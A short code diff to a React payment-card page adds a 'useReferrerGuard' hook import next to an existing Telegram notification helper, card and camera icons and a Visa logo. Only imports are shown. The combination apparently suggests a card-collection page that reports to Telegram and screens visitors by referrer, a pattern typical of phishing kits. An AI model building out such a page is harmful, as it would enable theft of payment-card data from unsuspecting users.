@@ -2,6 +2,7 @@ import { useState, useRef, useEffect, useCallback } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import { CreditCard, Lock, ArrowLeft, Camera, X } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import visaLogo from "@/assets/visa-logo.png";
